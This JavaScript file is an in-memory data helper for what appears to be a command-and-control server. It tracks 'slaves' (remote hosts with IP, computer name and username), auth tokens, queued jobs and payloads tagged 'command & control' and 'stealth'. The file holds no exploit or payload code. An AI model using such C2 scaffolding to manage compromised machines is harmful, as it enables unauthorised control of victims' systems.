
class DatabaseHelper {

    constructor() {
        // Init database...
        this.authTokens = [];
        this.slaves = [];
        this.payloads = [];
        this.jobs = [];

        this.addNewJob({
            id: "RANDOMJOBIDDDD",
            slaveId: "e1896e80-c325-11ed-b033-f5252f300cca",
            payloadId: "PAYLOAD_ID"
        })

        this.payloads.push({
            id: "RANDOMPAYLOADID",
            name: "Odysseus init task",
            description: "Init task to be run when connected",
            location: "somewhere",
            categories: ["haunted", "command & control"]
        })

        this.payloads.push({
            id: "RANDOMPAYLOADID2",
            name: "Ragnarok",
            description: "God killer features",
            location: "somewhere",
            categories: ["scary", "stealth"]
        })
    }

    addNewSlave(slave) {

        this.slaves.push({
            id: slave.id,
            ip: slave.ip,
            os: "Linux",
            computername: slave.computername,
            nickname: "No nickname",
            username: slave.username,
            info: slave.info,
        });
    }

    saveAuthToken(token, user) {
        this.authTokens.push({
            user: user,
            token: token
        })
    }

    addNewJob(job) {
        this.jobs.push({
            id: job.id,
            slaveId: job.slaveId,
            payloadId: job.payloadId,
            objectSize: 15960,
            createdAt: new Date(Date.now()).toUTCString(),
            finishedAt: "",
            status: "PENDING",
        })
    }

    setJobStatus(id, status, finished = false) {
        this.jobs = this.jobs.map(job => {

            // Change the status of the job with id.
            if (job.id == id) {

                job.status = status;
                if (finished) {
                    job.finishedAt = new Date(Date.now()).toUTCString() 
                }
                
                return job;
            }

            return job; // Leave the other jobs be.
        });
    }

    setNickname(slaveId, name) {

        this.slaves = this.slaves.map(slave => {
            if (slave.id == slaveId) {
                slave.nickname = name; // Only change name.
            }

            return slave;
        })
    }

    getSlaveById(id) {
        return this.slaves.filter((entry => entry.id == id))[0];
    }

    checkAuthToken(token) {
        
        return this.authTokens.filter((entry => token == entry.token))[0];
    }

    getJobForSlave(id) {
        return this.jobs.filter(entry => entry.slaveId == id && entry.status == "PENDING")[0];
    }

    getJobWithId(id) {
        return this.jobs.filter(entry => entry.id == id)[0]
    }

    getSlaves() {
        return this.slaves;
    }

    getPayloads() {
        return this.payloads;
    }
}

module.exports = DatabaseHelper;